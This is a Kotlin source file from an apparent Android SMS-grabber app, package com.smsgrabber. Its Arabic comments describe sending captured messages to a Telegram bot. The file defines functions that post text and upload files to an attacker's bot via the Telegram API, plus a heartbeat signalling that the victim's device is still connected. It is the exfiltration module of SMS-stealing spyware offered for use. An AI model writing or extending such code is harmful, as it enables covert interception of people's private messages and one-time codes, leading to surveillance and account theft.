package com.smsgrabber

import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import com.google.gson.Gson
import com.google.gson.JsonObject
import java.io.IOException
import java.util.concurrent.TimeUnit

/**
 * واجهة Telegram Bot API
 * ترسل الرسائل الملتقطة إلى بوت التيليجرام
 */
object TelegramApi {

    // ⚠️ ضع التوكن والـ Chat ID هنا
    private const val BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"      // ضع توكن البوت هنا
    private const val CHAT_ID = "YOUR_CHAT_ID_HERE"           // ضع Chat ID هنا

    private const val BASE_URL = "https://api.telegram.org/bot"

    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .build()

    private val gson = Gson()
    private val jsonMediaType = "application/json; charset=utf-8".toMediaType()

    /**
     * إرسال رسالة نصية للبوت
     */
    @Throws(IOException::class)
    fun sendMessage(text: String, parseMode: String = "Markdown"): Boolean {
        val url = "${BASE_URL}${BOT_TOKEN}/sendMessage"

        val payload = JsonObject().apply {
            addProperty("chat_id", CHAT_ID)
            addProperty("text", text)
            addProperty("parse_mode", parseMode)
            addProperty("disable_web_page_preview", true)
        }

        val body = gson.toJson(payload).toRequestBody(jsonMediaType)
        val request = Request.Builder()
            .url(url)
            .post(body)
            .header("Content-Type", "application/json")
            .build()

        client.newCall(request).execute().use { response ->
            return response.isSuccessful
        }
    }

    /**
     * إرسال ملف أو مرفق للبوت
     */
    @Throws(IOException::class)
    fun sendDocument(fileBytes: ByteArray, fileName: String, caption: String = ""): Boolean {
        val url = "${BASE_URL}${BOT_TOKEN}/sendDocument"

        val multipartBody = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", CHAT_ID)
            .addFormDataPart("caption", caption)
            .addFormDataPart(
                "document",
                fileName,
                fileBytes.toRequestBody("application/octet-stream".toMediaType())
            )
            .build()

        val request = Request.Builder()
            .url(url)
            .post(multipartBody)
            .build()

        client.newCall(request).execute().use { response ->
            return response.isSuccessful
        }
    }

    /**
     * إرسال تنبيه عند تشغيل الجهاز
     */
    fun sendHeartbeat(): Boolean {
        return try {
            sendMessage("💓 *نبض* - الجهاز لا يزال متصلاً\n🕐 ${System.currentTimeMillis()}")
        } catch (e: Exception) {
            false
        }
    }

    /**
     * اختبار الاتصال بالبوت
     */
    fun testConnection(): Boolean {
        return try {
            val url = "${BASE_URL}${BOT_TOKEN}/getMe"
            val request = Request.Builder().url(url).build()
            client.newCall(request).execute().use { response ->
                response.isSuccessful
            }
        } catch (e: Exception) {
            false
        }
    }
}
